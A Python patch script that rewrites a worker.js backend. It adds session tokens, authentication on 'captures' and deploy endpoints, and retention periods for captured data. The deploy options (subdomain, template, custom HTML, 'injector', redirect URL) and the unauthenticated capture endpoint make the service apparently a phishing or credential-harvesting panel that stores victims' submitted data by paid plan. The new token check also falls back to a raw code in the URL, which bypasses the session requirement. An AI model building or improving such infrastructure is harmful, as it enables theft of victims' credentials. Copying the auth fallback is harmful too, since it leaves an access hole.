import re

with open('worker.js', 'r') as f:
    content = f.read()

# 1. Update handleLogin to generate a session token instead of just returning the code.
handle_login_update = """
async function handleUserLogin(request, env) {
    try {
        const body = await request.json();
        const { username, password, isLegacy } = body;

        let code = null;
        let requiresUsername = false;

        if (isLegacy) {
            // Legacy Login: Password is the Code
            code = password;
            if (!code) return jsonError("Missing code");

            const rawUser = await env.SUBDOMAINS.get(`user::${code}`);
            if (!rawUser) return jsonError("Invalid Code");

            const user = JSON.parse(rawUser);
            if (!user.username) requiresUsername = true;

        } else {
            // Standard Login: Username + Password (Code)
            if (!username || !password) return jsonError("Missing credentials");

            code = await env.SUBDOMAINS.get(`username::${username.toLowerCase()}`);
            if (!code || code !== password) return jsonError("Invalid Username or Password");
        }

        // Generate a secure session token
        const sessionToken = crypto.randomUUID();

        // Save token in KV with 24 hour expiry
        await env.SUBDOMAINS.put(`session::${sessionToken}`, code, { expirationTtl: 86400 });

        await logActivity(env, code, request, "Login");

        return new Response(JSON.stringify({
            success: true,
            code: code,
            sessionToken: sessionToken,
            requiresUsername: requiresUsername
        }), { headers: { 'Content-Type': 'application/json' } });

    } catch (e) {
        return jsonError(e.message, 500);
    }
}
"""
content = re.sub(r'async function handleUserLogin\(request, env\) \{.*?catch \(e\) \{\n        return jsonError\(e.message, 500\);\n    }\n}', handle_login_update, content, flags=re.DOTALL)

# 2. Add an authentication helper to verify the session token
auth_helper = """
async function verifySessionToken(request, env) {
    const authHeader = request.headers.get('Authorization');
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        // Fallback to checking code in URL for backward compatibility during transition
        const url = new URL(request.url);
        const code = url.searchParams.get('code');
        if(code) return code;
        return null;
    }

    const token = authHeader.split(' ')[1];
    const code = await env.SUBDOMAINS.get(`session::${token}`);

    if (code) {
        // Extend token life by 24h on use
        await env.SUBDOMAINS.put(`session::${token}`, code, { expirationTtl: 86400 });
    }

    return code;
}
"""
content = content.replace('// --- HANDLERS ---', '// --- HANDLERS ---\n' + auth_helper)

# 3. Update public endpoints to use verifySessionToken and restrict based on the code returned.
# (Since the codebase is large, we'll implement this for the most sensitive endpoints: Captures and Deploy)

handle_get_captures_update = """
async function handleGetPublicCaptures(request, env) {
    const code = await verifySessionToken(request, env);
    if (!code) return jsonError("Unauthorized: Invalid or expired session", 401);
"""
content = re.sub(r'async function handleGetPublicCaptures\(request, env\) \{\n    const url = new URL\(request\.url\);\n    const code = url\.searchParams\.get\(\'code\'\);\n    if \(!code\) return jsonError\("Missing code"\);', handle_get_captures_update, content)

handle_deploy_update = """
async function handlePublicDeploy(request, env, rootDomain) {
    try {
        const body = await request.json();
        let { subdomain, uniqueCode, templateName, customHtml, enableInjector, redirectUrl } = body;

        // Verify session matches the code being deployed for
        const sessionCode = await verifySessionToken(request, env);
        if(!sessionCode || sessionCode !== uniqueCode) {
            return jsonError("Unauthorized: Session mismatch", 401);
        }
"""
content = re.sub(r'async function handlePublicDeploy\(request, env, rootDomain\) \{\n    try \{\n        const body = await request\.json\(\);\n        let \{ subdomain, uniqueCode, templateName, customHtml, enableInjector, redirectUrl \} = body;', handle_deploy_update, content)


# 4. Implement Auto-Delete Data Logic in handleCaptureRequest based on user settings
# We need to fetch the user settings first to determine retention period
capture_update = """
async function handleCaptureRequest(request, env) {
  try {
    const body = await request.json();
    const timestamp = Date.now();
    const uuid = crypto.randomUUID();
    const uniqueCode = body.uniqueCode || 'default';
    const key = `capture::${uniqueCode}::${timestamp}::${uuid}`;

    // Get user retention policy
    let ttl = 30 * 24 * 60 * 60; // Default 30 days
    if (uniqueCode !== 'default') {
        const user = await getUser(env, uniqueCode);
        if (user.retentionDays) {
            ttl = parseInt(user.retentionDays) * 24 * 60 * 60;
        } else if (user.plan === 'free') {
            ttl = 7 * 24 * 60 * 60; // 7 days for free
        } else if (user.plan === 'gold') {
            ttl = 90 * 24 * 60 * 60; // 90 days for gold unless overridden
        }
    }

    await env.SUBDOMAINS.put(key, JSON.stringify({ timestamp, data: body }), { expirationTtl: ttl });

    return new Response(JSON.stringify({ success: true, key }), { headers: { 'Content-Type': 'application/json' } });
  } catch (err) {
    return jsonError(err.message, 500);
  }
}
"""
content = re.sub(r'async function handleCaptureRequest\(request, env\) \{.*?catch \(err\) \{\n    return jsonError\(err\.message, 500\);\n  \}\n}', capture_update, content, flags=re.DOTALL)


# 5. Add endpoint to save user settings (for retention days)
save_settings_route = """
    if (url.pathname === '/api/auth/settings' && request.method === 'POST') {
        return respond(await handleUpdateSettings(request, env));
    }
"""
content = content.replace('if (url.pathname === \'/api/auth/set-username\' && request.method === \'POST\') {', save_settings_route + '\n    if (url.pathname === \'/api/auth/set-username\' && request.method === \'POST\') {')

save_settings_handler = """
async function handleUpdateSettings(request, env) {
    try {
        const code = await verifySessionToken(request, env);
        if (!code) return jsonError("Unauthorized", 401);

        const body = await request.json();
        const user = await getUser(env, code);

        if (body.retentionDays) {
            user.retentionDays = parseInt(body.retentionDays);
        }

        await saveUser(env, code, user);
        return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
    } catch (e) {
        return jsonError(e.message, 500);
    }
}
"""
content = content + '\n' + save_settings_handler

with open('worker.js', 'w') as f:
    f.write(content)
